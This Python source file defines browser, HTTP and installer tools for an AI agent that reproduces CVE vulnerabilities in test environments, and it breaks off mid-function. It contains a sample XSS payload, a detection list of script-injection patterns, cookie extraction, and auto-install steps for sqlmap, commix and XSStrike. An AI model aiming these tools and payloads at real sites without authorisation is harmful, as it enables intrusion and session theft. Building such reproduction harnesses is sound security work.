"""
FreestyleAgent - 自由探索模式的核心 Agent

用于处理不适合固定流程的漏洞类型:
- JavaScript 库漏洞 (需要 HTML + 浏览器)
- 配置类漏洞 
- 复杂的多步骤漏洞
- 需要特殊环境的漏洞

核心理念: 给 Agent 足够的权限和工具，让它自主决定如何复现漏洞
"""

import os
import json
import subprocess
import time
import urllib.parse
import shutil
from typing import Optional, Dict, Any, Annotated

from agentlib import AgentWithHistory
from agentlib.lib import tools

# 导入已有的工具
from toolbox.tools import TOOLS


# ============================================================
# 工具自动安装辅助函数
# ============================================================

def _ensure_tool_installed(tool_name: str, install_commands: list) -> tuple[bool, str]:
    """
    确保工具已安装，如果未安装则尝试自动安装
    
    :param tool_name: 工具名称（用于 which/shutil.which 检查）
    :param install_commands: 安装命令列表，按优先级尝试
    :return: (是否安装成功, 消息)
    """
    # 检查是否已安装
    if shutil.which(tool_name):
        return True, f"{tool_name} 已安装"
    
    # 尝试安装
    for cmd in install_commands:
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300,  # 5分钟超时
            )
            if result.returncode == 0:
                # 验证安装
                if shutil.which(tool_name):
                    return True, f"{tool_name} 安装成功"
        except Exception as e:
            continue
    
    return False, f"{tool_name} 安装失败，请手动安装"


def _install_sqlmap() -> tuple[bool, str]:
    """安装 SQLMap"""
    return _ensure_tool_installed("sqlmap", [
        "pip3 install sqlmap",
        "pip install sqlmap",
        "apt-get update && apt-get install -y sqlmap",
    ])


def _install_nmap() -> tuple[bool, str]:
    """安装 Nmap"""
    return _ensure_tool_installed("nmap", [
        "apt-get update && apt-get install -y nmap",
    ])


def _install_nikto() -> tuple[bool, str]:
    """安装 Nikto"""
    return _ensure_tool_installed("nikto", [
        "apt-get update && apt-get install -y nikto",
    ])


def _install_semgrep() -> tuple[bool, str]:
    """安装 Semgrep"""
    return _ensure_tool_installed("semgrep", [
        "pip3 install semgrep",
        "pip install semgrep",
    ])


def _install_commix() -> tuple[bool, str]:
    """安装 Commix"""
    # Commix 需要特殊处理
    if shutil.which("commix") or shutil.which("commix.py") or os.path.exists("/opt/commix/commix.py"):
        return True, "commix 已安装"
    
    try:
        # 克隆并设置
        cmds = [
            "git clone --depth 1 https://github.com/commixproject/commix.git /opt/commix",
            "ln -sf /opt/commix/commix.py /usr/local/bin/commix",
            "chmod +x /opt/commix/commix.py",
        ]
        for cmd in cmds:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=120)
        
        if os.path.exists("/opt/commix/commix.py"):
            return True, "commix 安装成功"
    except Exception as e:
        pass
    
    return False, "commix 安装失败"


def _install_xsstrike() -> tuple[bool, str]:
    """安装 XSStrike"""
    if shutil.which("xsstrike") or shutil.which("xsstrike.py") or os.path.exists("/opt/xsstrike/xsstrike.py"):
        return True, "xsstrike 已安装"
    
    try:
        cmds = [
            "git clone --depth 1 https://github.com/s0md3v/XSStrike.git /opt/xsstrike",
            "pip3 install -r /opt/xsstrike/requirements.txt || true",
            "ln -sf /opt/xsstrike/xsstrike.py /usr/local/bin/xsstrike",
            "chmod +x /opt/xsstrike/xsstrike.py",
        ]
        for cmd in cmds:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=120)
        
        if os.path.exists("/opt/xsstrike/xsstrike.py"):
            return True, "xsstrike 安装成功"
    except Exception as e:
        pass
    
    return False, "xsstrike 安装失败"


# ============================================================
# 专用工具函数 - 使用 agentlib 的 @tools.tool 装饰器
# ============================================================

@tools.tool
def create_html_test_page(filename: str, html_content: str, cve_id: str = "test") -> str:
    """
    创建 HTML 测试页面用于漏洞复现
    
    :param filename: 文件名 (如 test.html, poc.html)
    :param html_content: 完整的 HTML 内容
    :param cve_id: CVE ID，用于创建子目录
    :return: 创建结果信息
    """
    try:
        work_dir = "/workspaces/submission/src/simulation_environments"
        test_dir = os.path.join(work_dir, cve_id)
        os.makedirs(test_dir, exist_ok=True)
        
        filepath = os.path.join(test_dir, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return f"SUCCESS: HTML 文件已创建: {filepath}, URL路径: /{filename}"
    except Exception as e:
        return f"ERROR: 创建失败: {str(e)}"


@tools.tool
def start_http_server(directory: str, port: int = 8080) -> str:
    """
    启动简单的 HTTP 服务器来托管静态文件（用于测试 HTML/JS 漏洞）
    
    :param directory: 要服务的目录路径
    :param port: 端口号 (默认 8080)
    :return: 启动结果信息
    """
    try:
        # 先尝试杀掉占用该端口的进程
        subprocess.run(f"fuser -k {port}/tcp 2>/dev/null || true", shell=True)
        time.sleep(0.5)
        
        # 使用 Python 的 http.server
        process = subprocess.Popen(
            ["python3", "-m", "http.server", str(port)],
            cwd=directory,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            start_new_session=True
        )
        
        # 等待服务启动
        time.sleep(1.5)
        
        if process.poll() is None:  # 进程仍在运行
            return f"SUCCESS: HTTP 服务器已启动在 http://localhost:{port}，服务目录: {directory}, PID: {process.pid}"
        else:
            stderr = process.stderr.read().decode() if process.stderr else ""
            return f"ERROR: 服务器启动失败: {stderr}"
    except Exception as e:
        return f"ERROR: 启动失败: {str(e)}"


@tools.tool
def run_browser_test(url: str, javascript_code: str = "", wait_for_selector: str = "", wait_timeout: int = 10) -> str:
    """
    使用 Selenium 运行浏览器测试，验证漏洞
    支持等待动态加载的元素（适用于 Vue.js/React 等 SPA 应用）
    
    :param url: 要访问的 URL
    :param javascript_code: 要执行的 JavaScript 代码（可选）
    :param wait_for_selector: 等待该 CSS 选择器的元素出现后再执行 JS（可选，用于 SPA 动态加载）
    :param wait_timeout: 等待元素的超时时间（秒），默认 10 秒
    :return: 测试结果
    """
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-web-security')
        
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(30)
        
        driver.get(url)
        
        # 如果指定了等待选择器，使用 WebDriverWait 等待元素出现
        if wait_for_selector:
            try:
                WebDriverWait(driver, wait_timeout).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, wait_for_selector))
                )
            except Exception as wait_err:
                # 即使等待失败也继续，但记录警告
                pass
        else:
            # 没有指定选择器时，等待页面基本加载完成
            time.sleep(3)
            # 额外等待 Vue.js/React 等框架的初始化
            try:
                driver.execute_script("return document.readyState") == 'complete'
                # 等待常见的 SPA 框架初始化
                driver.execute_script("""
                    return new Promise((resolve) => {
                        if (document.querySelector('#app') || document.querySelector('[data-v-app]')) {
                            // Vue.js app - wait a bit more
                            setTimeout(resolve, 1000);
                        } else {
                            resolve();
                        }
                    });
                """)
            except:
                pass
        
        result_parts = [
            f"Page Title: {driver.title}",
            f"Current URL: {driver.current_url}",
            f"Page Source Preview: {driver.page_source[:2000] if driver.page_source else 'N/A'}",
        ]
        
        # 如果有自定义 JavaScript
        if javascript_code:
            try:
                # 使用更安全的 JavaScript 执行，包装在 try-catch 中并增加元素等待
                wrapped_js = f"""
                    try {{
                        // 等待元素可能存在的情况
                        const waitForElement = (selector, timeout = 5000) => {{
                            return new Promise((resolve, reject) => {{
                                const element = document.querySelector(selector);
                                if (element) {{
                                    resolve(element);
                                    return;
                                }}
                                const observer = new MutationObserver((mutations, obs) => {{
                                    const el = document.querySelector(selector);
                                    if (el) {{
                                        obs.disconnect();
                                        resolve(el);
                                    }}
                                }});
                                observer.observe(document.body, {{ childList: true, subtree: true }});
                                setTimeout(() => {{
                                    observer.disconnect();
                                    reject(new Error('Element not found: ' + selector));
                                }}, timeout);
                            }});
                        }};
                        // 执行用户代码
                        {javascript_code}
                    }} catch (e) {{
                        return 'JS_ERROR: ' + e.message;
                    }}
                """
                js_result = driver.execute_script(wrapped_js)
                result_parts.append(f"JS Result: {str(js_result) if js_result is not None else 'null'}")
            except Exception as js_err:
                result_parts.append(f"JS Error: {str(js_err)}")
        
        # 获取控制台日志
        try:
            logs = driver.get_log('browser')
            if logs:
                result_parts.append(f"Console Logs: {[log['message'] for log in logs[:10]]}")
        except:
            pass
        
        driver.quit()
        return "SUCCESS: " + "\n".join(result_parts)
        
    except Exception as e:
        return f"ERROR: 浏览器测试失败: {str(e)}"


@tools.tool  
def verify_window_opener_vulnerability(victim_page_url: str) -> str:
    """
    专门验证 window.opener 漏洞（如 smartbanner.js CVE-2025-25300）
    检查页面上的 target="_blank" 链接是否有 rel="noopener" 保护
    
    :param victim_page_url: 包含漏洞链接的页面 URL
    :return: 验证结果
    """
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.common.by import By
        
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        driver = webdriver.Chrome(options=options)
        driver.get(victim_page_url)
        time.sleep(2)
        
        # 查找所有 target="_blank" 的链接
        links = driver.find_elements(By.CSS_SELECTOR, 'a[target="_blank"]')
        
        if not links:
            driver.quit()
            return "NOT VULNERABLE: 页面上没有找到 target=_blank 的链接"
        
        vulnerable_links = []
        safe_links = []
        
        for link in links:
            rel_attr = link.get_attribute('rel') or ""
            href = link.get_attribute('href') or ""
            
            if 'noopener' in rel_attr.lower():
                safe_links.append(href[:80])
            else:
                vulnerable_links.append(href[:80])
        
        driver.quit()
        
        if vulnerable_links:
            return f"VULNERABLE: 发现 {len(vulnerable_links)} 个没有 rel='noopener' 保护的链接: {vulnerable_links}"
        else:
            return f"NOT VULNERABLE: 所有 {len(safe_links)} 个链接都有 noopener 保护"
            
    except Exception as e:
        return f"ERROR: 验证失败: {str(e)}"


@tools.tool
def browser_interact_spa(url: str, actions: str) -> str:
    """
    专门用于与 SPA 应用（Vue.js, React, Angular）交互的浏览器自动化工具。
    自动等待元素加载后再执行操作，适合动态渲染的页面。
    
    :param url: 要访问的 URL
    :param actions: JSON 格式的操作列表，每个操作包含:
        - type: "click", "input", "wait", "execute_js", "get_text", "screenshot"
        - selector: CSS 选择器（click, input, get_text 需要）
        - value: 输入的值（input 需要）或要执行的 JS 代码（execute_js 需要）
        - timeout: 等待超时（秒），默认 10
        示例: '[{"type":"wait","selector":"button"},{"type":"click","selector":"button.submit"},{"type":"input","selector":"input[name=email]","value":"test@test.com"}]'
    :return: 操作结果
    """
    try:
        import json
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        from selenium.webdriver.common.keys import Keys
        
        # 解析操作列表
        try:
            action_list = json.loads(actions)
        except json.JSONDecodeError as e:
            return f"ERROR: actions 参数不是有效的 JSON: {str(e)}"
        
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-web-security')
        options.add_argument('--window-size=1920,1080')
        
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(60)
        
        results = []
        
        # 访问 URL
        driver.get(url)
        results.append(f"Navigated to: {url}")
        
        # 等待页面基本加载
        time.sleep(2)
        
        # 等待 SPA 框架初始化
        try:
            WebDriverWait(driver, 10).until(
                lambda d: d.execute_script("return document.readyState") == 'complete'
            )
        except:
            pass
        
        # 执行每个操作
        for i, action in enumerate(action_list):
            action_type = action.get('type', '')
            selector = action.get('selector', '')
            value = action.get('value', '')
            timeout = action.get('timeout', 10)
            
            try:
                if action_type == 'wait':
                    # 等待元素出现
                    element = WebDriverWait(driver, timeout).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    results.append(f"Action {i+1} (wait): Element '{selector}' found")
                    
                elif action_type == 'click':
                    # 等待元素出现
                    element = WebDriverWait(driver, timeout).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    # 滚动到元素可见位置
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
                    time.sleep(0.3)
                    
                    # 检查是否是 checkbox - 需要特殊处理
                    elem_type = element.get_attribute('type')
                    if elem_type == 'checkbox':
                        # 对于 checkbox，直接用 JS 设置 checked 并触发 change 事件
                        driver.execute_script("""
                            arguments[0].checked = true;
                            arguments[0].dispatchEvent(new Event('change', { bubbles: true }));
                            arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                        """, element)
                        results.append(f"Action {i+1} (click): Checked checkbox '{selector}'")
                    else:
                        # 使用 JavaScript 点击
                        driver.execute_script("arguments[0].click();", element)
                        results.append(f"Action {i+1} (click): Clicked '{selector}'")
                    time.sleep(0.5)
                    
                elif action_type == 'input':
                    # 等待输入元素然后输入
                    element = WebDriverWait(driver, timeout).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    # 滚动到元素可见
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
                    time.sleep(0.2)
                    # 使用 JS 设置值并触发事件（对 Vue.js 更可靠）
                    driver.execute_script("""
                        arguments[0].value = arguments[1];
                        arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                        arguments[0].dispatchEvent(new Event('change', { bubbles: true }));
                    """, element, value)
                    results.append(f"Action {i+1} (input): Input '{value}' to '{selector}'")
                    
                elif action_type == 'execute_js':
                    # 执行 JavaScript
                    js_result = driver.execute_script(value)
                    results.append(f"Action {i+1} (execute_js): Result = {js_result}")
                    
                elif action_type == 'get_text':
                    # 获取元素文本
                    element = WebDriverWait(driver, timeout).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    text = element.text
                    results.append(f"Action {i+1} (get_text): '{selector}' text = '{text[:200]}'")
                    
                elif action_type == 'screenshot':
                    # 截图（保存到指定路径或默认路径）
                    screenshot_path = value or f"/tmp/screenshot_{i}.png"
                    driver.save_screenshot(screenshot_path)
                    results.append(f"Action {i+1} (screenshot): Saved to {screenshot_path}")
                    
                elif action_type == 'sleep':
                    # 显式等待
                    sleep_time = float(value) if value else 1
                    time.sleep(sleep_time)
                    results.append(f"Action {i+1} (sleep): Waited {sleep_time}s")
                    
                else:
                    results.append(f"Action {i+1}: Unknown action type '{action_type}'")
                    
            except Exception as action_err:
                results.append(f"Action {i+1} ({action_type}) FAILED: {str(action_err)}")
                # 获取当前页面状态以便调试
                results.append(f"Current URL: {driver.current_url}")
                results.append(f"Page title: {driver.title}")
        
        # 获取最终页面状态
        final_state = {
            "url": driver.current_url,
            "title": driver.title,
            "source_preview": driver.page_source[:2000] if driver.page_source else "N/A"
        }
        
        # 获取控制台日志
        try:
            logs = driver.get_log('browser')
            if logs:
                final_state["console_logs"] = [log['message'] for log in logs[:10]]
        except:
            pass
        
        driver.quit()
        
        return "SUCCESS:\n" + "\n".join(results) + f"\n\nFinal State:\n{json.dumps(final_state, indent=2)}"
        
    except Exception as e:
        return f"ERROR: 浏览器自动化失败: {str(e)}"


@tools.tool
def install_npm_package(package_name: str, version: str = "", work_dir: str = "") -> str:
    """
    安装 npm 包（用于测试 JavaScript 库漏洞）
    
    :param package_name: npm 包名 (如 smartbanner.js)
    :param version: 版本号 (如 1.14.0)，不指定则安装最新版
    :param work_dir: 工作目录，不指定则使用默认目录
    :return: 安装结果
    """
    try:
        if not work_dir:
            work_dir = "/workspaces/submission/src/simulation_environments/npm_test"
        
        os.makedirs(work_dir, exist_ok=True)
        
        # 初始化 npm 项目（如果需要）
        if not os.path.exists(os.path.join(work_dir, "package.json")):
            subprocess.run(["npm", "init", "-y"], cwd=work_dir, capture_output=True)
        
        # 安装包
        pkg_spec = f"{package_name}@{version}" if version else package_name
        result = subprocess.run(
            ["npm", "install", pkg_spec],
            cwd=work_dir,
            capture_output=True,
            text=True,
            timeout=120
        )
        
        if result.returncode == 0:
            installed_path = os.path.join(work_dir, "node_modules", package_name)
            return f"SUCCESS: 成功安装 {pkg_spec}, 路径: {installed_path}"
        else:
            return f"ERROR: 安装失败: {result.stderr}"
    except Exception as e:
        return f"ERROR: 安装异常: {str(e)}"


@tools.tool
def test_xss_in_response(url: str, payload: str = "<script>alert('XSS')</script>", method: str = "GET", data: str = "", headers: str = "") -> str:
    """
    测试 URL 响应中是否存在 XSS 漏洞（检查 payload 是否未被转义）
    
    :param url: 目标 URL
    :param payload: XSS payload，默认为 <script>alert('XSS')</script>
    :param method: HTTP 方法，GET 或 POST
    :param data: POST 数据（JSON 格式字符串）
    :param headers: 额外的 HTTP 头（JSON 格式字符串）
    :return: XSS 测试结果
    """
    import urllib.request
    import urllib.error
    import json as json_lib
    
    try:
        # 构建请求
        req_url = url
        req_data = None
        
        if method.upper() == "POST" and data:
            req_data = data.encode('utf-8')
        elif method.upper() == "GET" and "?" not in url:
            # 如果是 GET 且 payload 需要作为参数
            req_url = f"{url}?q={urllib.parse.quote(payload)}"
        
        req = urllib.request.Request(req_url, data=req_data, method=method.upper())
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) XSS-Tester')
        req.add_header('Accept', 'text/html,application/xhtml+xml,*/*')
        
        if headers:
            try:
                for k, v in json_lib.loads(headers).items():
                    req.add_header(k, v)
            except:
                pass
        
        if req_data and 'Content-Type' not in str(req.headers):
            req.add_header('Content-Type', 'application/json')
        
        # 发送请求
        response = urllib.request.urlopen(req, timeout=30)
        content = response.read().decode('utf-8', errors='ignore')
        
        # 检查响应中是否包含未转义的 payload
        # XSS 存在的标志：payload 原样出现在响应中
        xss_indicators = [
            payload,  # 原始 payload
            payload.replace("'", '"'),  # 单引号变双引号
            payload.replace("<", "&lt;").replace(">", "&gt;"),  # HTML 转义（安全）
        ]
        
        is_vulnerable = False
        evidence = ""
        
        if payload in content:
            # payload 原样出现 - 可能有 XSS
            is_vulnerable = True
            # 找出 payload 在响应中的上下文
            idx = content.find(payload)
            context_start = max(0, idx - 50)
            context_end = min(len(content), idx + len(payload) + 50)
            evidence = content[context_start:context_end]
        
        if is_vulnerable:
            return f"""VULNERABLE: XSS 漏洞确认！
- URL: {req_url}
- Payload: {payload}
- 响应状态: {response.status}
- 证据（payload 在响应中未转义）:
...{evidence}...

漏洞已触发！payload 在响应中原样出现，未经 HTML 转义。"""
        else:
            # 检查是否被转义
            escaped_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
            if escaped_payload in content:
                return f"""SAFE: 输入被正确转义
- URL: {req_url}
- Payload: {payload}
- 响应状态: {response.status}
- 发现转义后的内容，XSS 被防护"""
            else:
                return f"""INCONCLUSIVE: 无法确定 XSS 状态
- URL: {req_url}
- Payload: {payload}
- 响应状态: {response.status}
- 响应长度: {len(content)} bytes
- payload 未在响应中出现（可能需要不同的注入点）"""
                
    except urllib.error.HTTPError as e:
        return f"HTTP ERROR: {e.code} {e.reason}"
    except Exception as e:
        return f"ERROR: {type(e).__name__}: {str(e)}"


# ========== 通用浏览器自动化工具 ==========

# 全局浏览器 Session 管理
_browser_sessions = {}

@tools.tool
def browser_session_start(session_id: str = "default") -> str:
    """
    启动一个浏览器 Session（Selenium Chrome Headless）
    
    :param session_id: Session 标识符，用于后续操作引用
    :return: 启动结果
    """
    global _browser_sessions
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    
    try:
        if session_id in _browser_sessions:
            return f"Session '{session_id}' 已存在，请先调用 browser_session_close 关闭"
        
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--window-size=1920,1080')
        
        driver = webdriver.Chrome(options=chrome_options)
        driver.set_page_load_timeout(60)
        
        _browser_sessions[session_id] = {
            'driver': driver,
            'cookies': {}
        }
        
        return f"SUCCESS: 浏览器 Session '{session_id}' 已启动"
    except Exception as e:
        return f"ERROR: 启动浏览器失败: {str(e)}"


@tools.tool
def browser_navigate(url: str, session_id: str = "default", wait_seconds: int = 5) -> str:
    """
    导航到指定 URL 并返回页面信息
    
    :param url: 要访问的 URL
    :param session_id: 浏览器 Session ID
    :param wait_seconds: 等待页面加载的秒数
    :return: 页面信息（URL、标题、部分内容）
    """
    global _browser_sessions
    
    try:
        if session_id not in _browser_sessions:
            return f"ERROR: Session '{session_id}' 不存在，请先调用 browser_session_start"
        
        driver = _browser_sessions[session_id]['driver']
        driver.get(url)
        time.sleep(wait_seconds)
        
        result = []
        result.append(f"URL: {driver.current_url}")
        result.append(f"Title: {driver.title}")
        result.append(f"Page length: {len(driver.page_source)}")
        
        # 返回页面前 2000 字符用于分析
        page_preview = driver.page_source[:2000]
        result.append(f"Preview:\n{page_preview}")
        
        return "\n".join(result)
    except Exception as e:
        return f"ERROR: 导航失败: {str(e)}"


@tools.tool
def browser_fill_form(fields: str, session_id: str = "default") -> str:
    """
    自动填写页面上的表单
    
    :param fields: JSON 格式的字段映射，如 '{"email": "test@test.com", "password": "pass123"}'
                   支持的 key: email, password, username, firstname, lastname, 或任意 CSS selector
    :param session_id: 浏览器 Session ID
    :return: 填写结果
    """
    global _browser_sessions
    from selenium.webdriver.common.by import By
    import json as json_module
    
    try:
        if session_id not in _browser_sessions:
            return f"ERROR: Session '{session_id}' 不存在"
        
        driver = _browser_sessions[session_id]['driver']
        field_map = json_module.loads(fields)
        
        results = []
        inputs = driver.find_elements(By.CSS_SELECTOR, 'input:not([type="hidden"]), textarea')
        
        for inp in inputs:
            try:
                if not inp.is_displayed():
                    continue
                    
                inp_type = (inp.get_attribute('type') or '').lower()
                inp_name = (inp.get_attribute('name') or '').lower()
                inp_id = (inp.get_attribute('id') or '').lower()
                inp_placeholder = (inp.get_attribute('placeholder') or '').lower()
                
                # 匹配字段
                for key, value in field_map.items():
                    key_lower = key.lower()
                    if (key_lower in inp_type or key_lower in inp_name or 
                        key_lower in inp_id or key_lower in inp_placeholder):
                        inp.clear()
                        inp.send_keys(value)
                        results.append(f"填写 {key}: {value[:20]}...")
                        break
            except:
                continue
        
        return "SUCCESS: " + ", ".join(results) if results else "WARNING: 没有找到匹配的输入框"
    except Exception as e:
        return f"ERROR: 填写表单失败: {str(e)}"


@tools.tool  
def browser_click(selector: str = "", button_text: str = "", session_id: str = "default") -> str:
    """
    点击页面上的元素
    
    :param selector: CSS 选择器（如 "button[type=submit]", "#login-btn"）
    :param button_text: 按钮文本（模糊匹配，如 "login", "submit", "next"）
    :param session_id: 浏览器 Session ID
    :return: 点击结果
    """
    global _browser_sessions
    from selenium.webdriver.common.by import By
    
    try:
        if session_id not in _browser_sessions:
            return f"ERROR: Session '{session_id}' 不存在"
        
        driver = _browser_sessions[session_id]['driver']
        
        element = None
        
        # 方式1: 通过 CSS selector
        if selector:
            try:
                element = driver.find_element(By.CSS_SELECTOR, selector)
            except:
                pass
        
        # 方式2: 通过按钮文本
        if not element and button_text:
            buttons = driver.find_elements(By.TAG_NAME, 'button')
            buttons += driver.find_elements(By.CSS_SELECTOR, 'input[type="submit"], input[type="button"], a.btn')
            
            for btn in buttons:
                try:
                    if btn.is_displayed() and btn.is_enabled():
                        text = (btn.text or btn.get_attribute('value') or '').lower()
                        if button_text.lower() in text:
                            element = btn
                            break
                except:
                    continue
        
        if element:
            element.click()
            time.sleep(2)
            return f"SUCCESS: 点击成功，当前 URL: {driver.current_url}"
        else:
            return f"ERROR: 未找到匹配的元素 (selector='{selector}', text='{button_text}')"
    except Exception as e:
        return f"ERROR: 点击失败: {str(e)}"


@tools.tool
def browser_get_cookies(session_id: str = "default") -> str:
    """
    获取当前浏览器 Session 的所有 Cookies（用于后续 API 调用认证）
    
    :param session_id: 浏览器 Session ID
    :return: JSON 格式的 Cookies
    """
    global _browser_sessions
    import json as json_module
    
    try:
        if session_id not in _browser_sessions:
            return f"ERROR: Session '{session_id}' 不存在"
        
        driver = _browser_sessions[session_id]['driver']
        cookies = driver.get_cookies()
        
        # 转换为简单格式
        simple_cookies = {c['name']: c['value'] for c in cookies}
        _browser_sessions[session_id]['cookies'] = simple_cookies
        
        return json_module.dumps(simple_cookies, indent=2)
    except Exception as e:
        return f"ERROR: 获取 Cookies 失败: {str(e)}"


@tools.tool
def browser_check_xss(xss_marker: str = "", check_js_var: str = "", session_id: str = "default") -> str:
    """
    检查当前页面是否存在 XSS 漏洞
    
    :param xss_marker: 要检查的 XSS 标记字符串（如果存在于未转义的 HTML 中则表示 XSS）
    :param check_js_var: 要检查的 JavaScript 变量名（如 "XSS_TRIGGERED"）
    :param session_id: 浏览器 Session ID
    :return: XSS 检测结果
    """
    global _browser_sessions
    
    try:
        if session_id not in _browser_sessions:
            return f"ERROR: Session '{session_id}' 不存在"
        
        driver = _browser_sessions[session_id]['driver']
        page_source = driver.page_source
        
        results = []
        xss_detected = False
        
        # 检查1: 标记字符串是否存在且未转义
        if xss_marker:
            if xss_marker in page_source:
                # 检查是否被转义
                if f"&lt;{xss_marker}" not in page_source and f"&gt;{xss_marker}" not in page_source:
                    results.append(f"✅ XSS 标记 '{xss_marker}' 存在于页面中（未转义）")
                    xss_detected = True
                else:
                    results.append(f"⚠️ XSS 标记存在但已被转义")
            else:
                results.append(f"❌ XSS 标记 '{xss_marker}' 未找到")
        
        # 检查2: 危险标签
        dangerous_patterns = ['onerror=', 'onload=', 'onclick=', 'onmouseover=', '<script>']
        for pattern in dangerous_patterns:
            if pattern in page_source and f"&lt;{pattern}" not in page_source:
                results.append(f"✅ 发现未转义的危险模式: {pattern}")
                xss_detected = True
        
        # 检查3: JavaScript 变量
        if check_js_var:
            try:
                js_value = driver.execute_script(f"return window.{check_js_var}")
                if js_value:
                    results.append(f"✅ JavaScript 变量 {check_js_var} = {js_value}")
                    xss_detected = True
                else:
                    results.append(f"❌ JavaScript 变量 {check_js_var} 未设置或为 false")
            except Exception as e:
                results.append(f"⚠️ 检查 JS 变量失败: {str(e)[:50]}")
        
        results.append("")
        results.append(f"XSS 检测结果: {'✅ 存在 XSS 漏洞!' if xss_detected else '❌ 未检测到 XSS'}")
        
        return "\n".join(results)
    except Exception as e:
        return f"ERROR: XSS 检测失败: {str(e)}"


@tools.tool
def browser_get_page_source(session_id: str = "default", max_length: int = 10000) -> str:
    """
    获取当前页面的 HTML 源码
    
    :param session_id: 浏览器 Session ID
    :param max_length: 返回的最大字符数
    :return: 页面 HTML 源码
    """
    global _browser_sessions
    
    try:
        if session_id not in _browser_sessions:
            return f"ERROR: Session '{session_id}' 不存在"
        
        driver = _browser_sessions[session_id]['driver']
        page_source = driver.page_source
        
        if len(page_source) > max_length:
            return page_source[:max_length] + f"\n\n... (截断，总长度 {len(page_source)})"
        return page_source
    except Exception as e:
        return f"ERROR: 获取页面源码失败: {str(e)}"


@tools.tool
def browser_screenshot(filepath: str, session_id: str = "default") -> str:
    """
    截取当前页面截图
    
    :param filepath: 截图保存路径
    :param session_id: 浏览器 Session ID
    :return: 截图结果
    """
    global _browser_sessions
    
    try:
        if session_id not in _browser_sessions:
            return f"ERROR: Session '{session_id}' 不存在"
        
        driver = _browser_sessions[session_id]['driver']
        driver.save_screenshot(filepath)
        return f"SUCCESS: 截图已保存到 {filepath}"
    except Exception as e:
        return f"ERROR: 截图失败: {str(e)}"


@tools.tool
def browser_session_close(session_id: str = "default") -> str:
    """
    关闭浏览器 Session
    
    :param session_id: 浏览器 Session ID
    :return: 关闭结果
    """
    global _browser_sessions
    
    try:
        if session_id not in _browser_sessions:
            return f"WARNING: Session '{session_id}' 不存在或已关闭"
        
        driver = _browser_sessions[session_id]['driver']
        driver.quit()
        del _browser_sessions[session_id]
        
        return f"SUCCESS: Session '{session_id}' 已关闭"
    except Exception as e:
        return f"ERROR: 关闭 Session 失败: {str(e)}"


@tools.tool
def http_request(method: str, url: str, headers: str = "", body: str = "", cookies: str = "") -> str:
    """
    发送 HTTP 请求（支持 GET, POST, PUT, PATCH, DELETE）
    
    :param method: HTTP 方法 (GET, POST, PUT, PATCH, DELETE)
    :param url: 请求 URL
    :param headers: JSON 格式的请求头，如 '{"Content-Type": "application/json"}'
    :param body: 请求体（POST/PUT/PATCH 时使用）
    :param cookies: JSON 格式的 Cookies，如 '{"session": "abc123"}'
    :return: 响应信息
    """
    import requests
    import json as json_module
    
    try:
        headers_dict = json_module.loads(headers) if headers else {}
        cookies_dict = json_module.loads(cookies) if cookies else {}
        
        method = method.upper()
        
        if method == 'GET':
            resp = requests.get(url, headers=headers_dict, cookies=cookies_dict, timeout=30)
        elif method == 'POST':
            if headers_dict.get('Content-Type') == 'application/json':
                resp = requests.post(url, headers=headers_dict, cookies=cookies_dict, json=json_module.loads(body) if body else None, timeout=30)
            else:
                resp = requests.post(url, headers=headers_dict, cookies=cookies_dict, data=body, timeout=30)
        elif method == 'PUT':
            resp = requests.put(url, headers=headers_dict, cookies=cookies_dict, json=json_module.loads(body) if body else None, timeout=30)
        elif method == 'PATCH':
            resp = requests.patch(url, headers=headers_dict, cookies=cookies_dict, json=json_module.loads(body) if body else None, timeout=30)
        elif method == 'DELETE':
            resp = requests.delete(url, headers=headers_dict, cookies=cookies_dict, timeout=30)
        else:
            return f"ERROR: 不支持的 HTTP 方法: {method}"
        
        result = []
        result.append(f"Status: {resp.status_code}")
        result.append(f"Headers: {dict(resp.headers)}")
        result.append(f"Body ({len(resp.text)} chars):")
        result.append(resp.text[:5000] if len(resp.text) > 5000 else resp.text)
        
        return "\n".join(result)
    except Exception as e:
        return f"ERROR: HTTP 请求失败: {str(e)}"


@tools.tool
def get_docker_container_ip(container_name: str) -> str:
    """
    获取 Docker 容器的 IP 地址（用于 Docker-in-Docker 场景）
    
    :param container_name: 容器名称或 ID
    :return: 容器 IP 地址
    """
    try:
        result = subprocess.run(
